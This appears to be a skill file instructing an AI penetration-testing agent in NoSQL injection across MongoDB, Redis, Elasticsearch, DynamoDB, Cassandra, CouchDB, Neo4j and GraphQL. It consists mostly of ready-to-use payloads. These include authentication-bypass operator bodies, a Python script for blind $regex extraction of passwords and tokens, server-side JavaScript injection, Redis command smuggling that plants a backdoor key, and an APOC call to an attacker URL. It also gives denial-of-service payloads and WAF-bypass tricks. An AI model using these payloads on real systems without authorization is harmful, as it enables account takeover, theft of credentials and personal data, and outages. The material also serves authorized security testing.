---
name: nosql-injection
description: NoSQL injection testing covering MongoDB operator injection, authentication bypass, blind extraction, GraphQL variable injection, and Redis/DynamoDB/Elasticsearch/Neo4j-specific attack surfaces — with mr.robot memory hooks and viability gating
kali_tools: curl, burpsuite, python3, nuclei
time:
  quick: 15m
  standard: 1h
  deep: 4h
github_fallbacks:
  nosqli: Charlie-belmer/nosqli
---

# NoSQL Injection

NoSQL injection exploits the mismatch between how applications pass user input to database queries and how the database engine interprets that input. Unlike SQL injection, NoSQL injection frequently involves operator injection (e.g., MongoDB's `$gt`, `$regex`, `$where`) or structure injection (embedding JSON sub-documents). The attack surface is broad: MongoDB is the dominant target, but Redis, Elasticsearch, DynamoDB, Cassandra, CouchDB, and Neo4j each have distinct injection surfaces. GraphQL resolvers passing variables directly into a backing NoSQL filter are a frequent cross-cutting vector.

## Before You Start (Memory)

Call `memory_recall_for_task` with queries like:
- "NoSQL injection MongoDB operator $ne $regex bypass"
- "MongoDB authentication bypass operator injection login"
- "GraphQL NoSQL injection resolver filter variable"
- "Redis command injection RESP protocol"
- "past NoSQL injection findings [target tech]"

Review recalled approaches — previous engagements may have confirmed whether MongoDB `$where` is enabled, identified which GraphQL input types reach NoSQL filters, or noted whether bracket-notation form-encoded injection was accepted.

## Viability Gate

| Budget | Approach |
|--------|----------|
| < 15m  | Hit the login endpoint with two payloads: (1) JSON body `{"username":{"$ne":null},"password":{"$ne":null}}` and (2) form-encoded `username[$ne]=x&password[$ne]=x`. If either returns a successful auth response, NoSQL injection is confirmed. Also check for MongoDB error messages in malformed-input responses to confirm the stack. |
| 15m–1h | Login bypass attempt (JSON + bracket form), `$regex` boolean oracle confirmation, error fingerprinting across multiple endpoints, search/filter endpoint operator probe, GraphQL variable injection if introspection is accessible, basic Elasticsearch `query_string` probe if ES indicators present. |
| 1h+    | Deep: blind `$regex` character extraction on token/password fields, `$where`/`$function` JavaScript injection testing, aggregation pipeline injection (`$lookup` collection pivot), Redis RESP injection, Neo4j Cypher injection with APOC abuse, CouchDB Mango injection, full DoS surface mapping (ReDoS, large `$in`, `$where` loops — authorized scope only). |

Hardware note: nosqli and python3 scripts are lightweight. Blind extraction automation is network-bound. nuclei nosqli templates use moderate rate — use `-rate-limit` if WAF is detected.

## Tool Inventory

```bash
which curl burpsuite python3 nuclei
# Check for nosqli
which nosqli || find /opt /home /tools -name "nosqli" 2>/dev/null | head -3
```

Missing a tool? → `arcade_report_blocker("[tool] not installed for nosql-injection")`

Or install from GitHub:
- `nosqli`: `git clone https://github.com/Charlie-belmer/nosqli && cd nosqli && go build -o /usr/local/bin/nosqli` (Charlie-belmer/nosqli — requires Go)

### Quick nuclei nosqli scan
```bash
nuclei -u https://TARGET -t /usr/share/nuclei-templates/vulnerabilities/nosqli/ -rate-limit 30
```

## Attack Surface

**Input shapes that reach query filters**
- JSON body parameters parsed straight into query objects
- Form fields with bracket notation (`field[$ne]=`) coerced into operator objects by Express, PHP, and similar middleware
- URL-encoded JSON in query strings, headers, and cookies
- GraphQL variables passed directly into resolver-level NoSQL filters

**Code patterns that enable injection**
- Raw filter dicts/objects from user input handed to `find`/`findOne`/`aggregate`
- String concatenation into Cypher / CQL / Redis commands instead of the driver's parameterized form
- ODM passthrough: Mongoose `{strict: false}`, Morphia raw `where()`, PyMongo `find()` with unsanitized JSON dicts (legacy `eval()` is fatal)
- Server-side JavaScript surfaces: `$where`, `$function`, `$accumulator`, CouchDB `_design` views

**Stores in scope**
MongoDB (primary), Redis, Elasticsearch, DynamoDB, Cassandra, CouchDB, Neo4j. Couchbase / DocumentDB / HBase / ScyllaDB / Memcached follow the same operator-injection or command-smuggling models — DocumentDB in particular accepts MongoDB payloads unchanged.

## High-Value Targets

- Login and authentication endpoints (username/password fields)
- Search and filter APIs (catalog, user search, admin lookup)
- Password reset and token lookup flows
- Admin queries filtering by role, plan, or privilege fields
- Endpoints accepting raw JSON objects as query parameters

## Reconnaissance

### Content-Type and Input Shape

- Identify endpoints accepting `application/json` — these can receive operator objects directly
- Identify endpoints accepting `application/x-www-form-urlencoded` — bracket notation `username[$ne]=x` maps to `{username: {$ne: 'x'}}` in many frameworks (Express `body-parser`, PHP)
- Determine whether the backend uses Mongoose, native MongoDB driver, or a REST ODM wrapper

### Error Fingerprinting

- Send malformed JSON: `{"username": {"$gt": ""}}`
- Send bracket notation in form data: `username[$gt]=`
- Look for MongoDB error messages: `MongoError`, `CastError`, `ValidationError`
- Stack traces revealing collection names, field names, driver version

### Operator Probe

Test whether operators pass through to the database:
```json
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```
If authentication succeeds or response differs, operator injection is confirmed.

## Key Vulnerabilities

### MongoDB Authentication Bypass

The classic operator injection against login queries of the form `db.users.findOne({username: input.username, password: input.password})`:

**JSON body injection:**
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
```
Matches the first document where both fields are non-null — typically the first user/admin.

**Form body (bracket notation):**
```
username[$ne]=invalid&password[$ne]=invalid
```

**Variations:**
```json
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$gt": ""}}
{"username": {"$in": ["admin", "administrator", "root"]}, "password": {"$gt": ""}}
```

### Blind Data Extraction via `$regex`

When the query result is not directly reflected but observable (boolean response, redirect, timing), extract field values character by character using `$regex`:
```json
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^b"}}
...
```
Binary search the character space to minimize requests. Works on any string field (token, reset code, API key).

```python
# Binary search $regex extraction
import requests, string

charset = string.ascii_letters + string.digits + string.punctuation
target = "admin"
field = "password"
url = "https://TARGET/api/login"
headers = {"Content-Type": "application/json"}

extracted = ""
while True:
    found = False
    for c in charset:
        payload = {
            "username": target,
            field: {"$regex": f"^{extracted}{c}"}
        }
        r = requests.post(url, json=payload, headers=headers)
        if r.status_code == 200 and "token" in r.text:  # adjust success indicator
            extracted += c
            found = True
            print(f"[+] Found: {extracted}")
            break
    if not found:
        print(f"[*] Final: {extracted}")
        break
```

### `$where` JavaScript Injection

If `$where` is enabled, inject server-side JavaScript. Inspect `security.javascriptEnabled` / `--noscripting`, managed-service restrictions, and the installed engine version. Verify operator availability, defaults, and supported functions against that build's documentation or controlled probes:
```json
{"$where": "function(){return this.role == 'admin'}"}
{"$where": "function(){return this.username == 'admin' && sleep(2000)}"}
```
`sleep()` is available in older MongoDB for blind extraction via response-time differential. Note: `sleep()` returns undefined (falsy), so no documents are returned from the sleep variant — observe latency, not result set.

### `$function` and `$accumulator` (MongoDB 4.4+)

Server-side JavaScript in aggregations. `$function` must live inside an expression context — `$expr`, `$project`, `$addFields`, etc. — not as a top-level filter:
```json
{"$expr": {"$function": {"body": "function(doc){return doc.role == 'admin'}", "args": ["$$ROOT"], "lang": "js"}}}
```
Gated by the same `javascriptEnabled` parameter as `$where`, but reachable through aggregation endpoints — useful when `$where` is filtered at the query layer but aggregation pipelines remain user-influenceable.

### Aggregation Pipeline Injection

`$match`, `$lookup`, and `$project` stages accept the same operator payloads as `find()`. User-controlled `$lookup.from` is the highest-impact variant — it can pivot the query to a different collection (e.g., from `orders` into `users`) and exfiltrate cross-tenant data.

### Redis Command Injection

When Redis commands are constructed by string concatenation:
```python
redis.execute_command(f"SET {user_key} {value}")
```
Inject newline characters (`\r\n`) to inject additional Redis commands (RESP protocol injection):
```
key\r\nSET backdoor attacker_controlled\r\nSET dummy
```

### Elasticsearch Query String Injection

`query_string` and `simple_query_string` accept Lucene syntax. User input flowing directly:
```
q=normal+search            →   normal results
q=*                        →   all documents
q=role:admin               →   filter by field
q=_exists_:password_hash   →   existence probe
```

For Painless script injection via `_update`:
```json
{"script": {"source": "ctx._source.role = params.r", "params": {"r": "admin"}}}
```
If the `source` field is user-controlled, inject arbitrary Painless.

### DynamoDB FilterExpression Injection

PartiQL injection allows expansion of intended queries:
```sql
-- Intended:
SELECT * FROM Users WHERE username = 'input'

-- Injected:
SELECT * FROM Users WHERE username = 'x' OR '1'='1
```

### Cassandra CQL Injection

CQL is SQL-shaped, so injection follows the SQL pattern when input is concatenated instead of bound via `session.prepare()`:

```
username: ' OR '1'='1' ALLOW FILTERING --
username: 'x' OR token(username) > token('a') ALLOW FILTERING --
```

No `SLEEP` or OOB primitive natively — detection is boolean/error-based only.

### CouchDB Mango and View Injection

Mango selectors on `_find` accept operator payloads in the same shape as MongoDB:
```json
POST /db/_find  { "selector": {"username": "admin", "password": {"$gt": ""}} }
POST /db/_find  { "selector": {"role": {"$regex": "^admin"}} }
```

`_design` document injection — if user input flows into a design doc's `views.<name>.map`, the JavaScript runs server-side in the Couch sandbox on every view query:
```json
{"views": {"x": {"map": "function(doc){ emit(doc._id, doc) }"}}}
```

Also probe `_all_docs?include_docs=true` for unscoped enumeration and check for admin-party misconfigurations (`_users/_all_docs` reachable without auth) before payload work.

### Neo4j Cypher Injection

When user input is concatenated into Cypher rather than passed as a parameter (`$param`):
```python
# Vulnerable
session.run(f"MATCH (u:User {{name: '{name}'}}) RETURN u")

# Injected: name = x'}) RETURN u UNION MATCH (u:User) RETURN u //
```

**APOC abuse** (when `apoc.*` procedures are enabled via `dbms.security.procedures.unrestricted`):
- `CALL apoc.load.json('http://attacker/x')` — SSRF and external data fetch
- `CALL apoc.cypher.run("...", {})` — dynamic query execution from a string
- `CALL dbms.security.listUsers()` — user enumeration on misconfigured Community Edition

### GraphQL Variable Injection

Resolvers passing variables straight into a backing NoSQL filter are a common chained vector:
```graphql
query Login($input: UserFilter!) {
  user(filter: $input) { id role }
}
```
With `$input` reaching `db.users.findOne(input)`, send:
```json
{"input": {"username": "admin", "password": {"$ne": ""}}}
```
Use introspection (`__schema`, `__type`) to enumerate which input types accept arbitrary objects — those are the operator-injection candidates.

### Server-Side JavaScript Detection and DoS

Fingerprint SSJS state before investing in `$where` / `$function` payloads:
```javascript
db.adminCommand({getParameter: 1, javascriptEnabled: 1})
```

DoS surface (use only with explicit authorization scope):
- **ReDoS**: `{"field": {"$regex": "^(a+)+$"}}` against long values triggers catastrophic backtracking
- **Large `$in` arrays**: thousands of values force linear scans on unindexed fields
- **Infinite `$where` loops**: `{"$where": "while(true){}"}` if SSJS is enabled without query timeouts
- **Heavy aggregations**: chained `$lookup` across large unindexed collections

## Bypass Techniques

**Type Coercion**
- Send operators as arrays: `{"$gt": [""]}` — some drivers coerce arrays
- Mix string and object types in the same request to trigger parser branches

**Encoding**
- URL-encode brackets: `username%5B%24ne%5D=x` → `username[$ne]=x`
- Double-encode for WAFs sitting in front of JSON-parsing backends

**Operator Alternatives**
- `$nin` (not in), `$exists: false`, `$type` — alternative operators that reach the same result when `$ne` is filtered
- `$not` wrapping another operator: `{"field": {"$not": {"$eq": "value"}}}`
- `$expr` with `$ne` for complex comparisons: `{"$expr": {"$ne": ["$password", "wrong"]}}`

**Structure Manipulation**
- Dotted-key vs nested object: `{"a.b": "c"}` vs `{"a": {"b": "c"}}` — sanitizers often strip one form but pass the other
- Array vs object operator wrapping: some parsers treat `["$or", ...]` as operator arrays
- Prototype pollution: `__proto__` and `constructor.prototype` keys in JSON bodies polluting Object prototypes consumed downstream by query builders
- `$regex` case-insensitive flag (`"$options": "i"`) widens matches that case-sensitive filters miss

## Testing Methodology

1. **Identify query-receiving endpoints** — login, search, filter, lookup
2. **Determine input format** — JSON body vs form fields vs URL params
3. **Send error-probing payloads** — malformed operator objects; watch for MongoDB/driver errors
4. **Attempt operator injection** — `$ne`, `$gt`, `$regex` against login endpoint
5. **Confirm boolean oracle** — response, status, redirect differs between true/false predicates
6. **Extract data blindly** — character-by-character `$regex` on sensitive fields (token, reset code)
7. **Test `$where`** — if older MongoDB version detected, attempt JavaScript sleep-based timing
8. **Probe aggregation endpoints** — inject operators into `filter`/`match`/`sort` fields
9. **Test non-MongoDB stores** — Elasticsearch `query_string`, Redis command construction, DynamoDB PartiQL, CouchDB Mango selectors, Neo4j Cypher concatenation, Cassandra CQL
10. **Test GraphQL resolvers** — submit operator objects via variables on any input type that reaches a NoSQL filter; use `__schema` introspection to enumerate candidates

## Validation

1. Demonstrate authentication bypass: send operator payload, confirm login succeeds for any/first account
2. Extract a verifiable secret (password hash, reset token, API key) via `$regex` blind extraction
3. Show at least two distinct operator payloads working to rule out coincidence
4. Provide before/after: normal request returns 401, injected request returns 200
5. For `$where`: show timing differential with/without `sleep()`

## False Positives

- Framework-level query builder that casts input to string before constructing the query (Mongoose `strict` mode on)
- Input sanitization stripping operator keys before they reach the driver
- Endpoints that accept JSON but cast the `password` field to string — operator object becomes `[object Object]`
- Response differences caused by validation errors, not actual operator execution

## Impact

- Authentication bypass granting access to arbitrary or all accounts
- Full extraction of sensitive fields (tokens, hashed passwords, PII) via blind regex enumeration
- Privilege escalation by querying admin/superuser records directly
- Data exfiltration at scale via widened `$ne`/`$regex`/`$gt` filters
- Server-side JavaScript execution via `$where` on unpatched MongoDB instances

## Pro Tips

1. Always try both JSON body (`{"field": {"$ne": null}}`) and bracket-notation form (`field[$ne]=`) — different middleware handles them differently
2. Target reset token and API key fields with `$regex` extraction, not just passwords
3. Check MongoDB version via error messages or `/admin/serverStatus`; `$where` is active by default on pre-7.0 instances — that includes 4.4–6.x targets where `javascriptEnabled` was deprecated but not yet disabled, making them still exploitable unless explicitly hardened
4. For Elasticsearch, try `_cat/indices`, `_mapping`, and `_search` with `query_string: *` before attempting script injection
5. Combine authentication bypass with a second request to `/admin` or `/api/users` to escalate impact
6. Automate `$regex` extraction with binary search: 7 requests per character vs 94 with linear search
7. GraphQL resolvers are an underexplored entry point — try operator objects in any input type that reaches a NoSQL filter, and use introspection to find candidate fields

## Summary

NoSQL injection exploits the same root cause as SQL injection — user input controlling query structure — but through operator embedding rather than syntax breaking. MongoDB is the primary target; enforce schema validation, use parameterized equivalents (strict mode, typed schemas), and never pass raw user input as a query object.

## After You Finish (Memory)

Call `memory_record_task_outcome` with:
```json
{
  "approach": "describe which store was targeted (MongoDB/Redis/ES/DynamoDB/CouchDB/Neo4j), which injection type worked ($ne/$regex/$where/bracket-form/GraphQL variable), which endpoints were vulnerable",
  "learned": "whether JSON or bracket form was accepted; MongoDB version and $where availability; which operator alternatives bypassed filters; whether blind $regex extraction was viable; GraphQL resolver paths found",
  "tools": "curl for direct injection probes, burpsuite for request manipulation and response diffing, python3 for automated $regex blind extraction, nuclei for template-based scanning, nosqli for automated discovery"
}
```
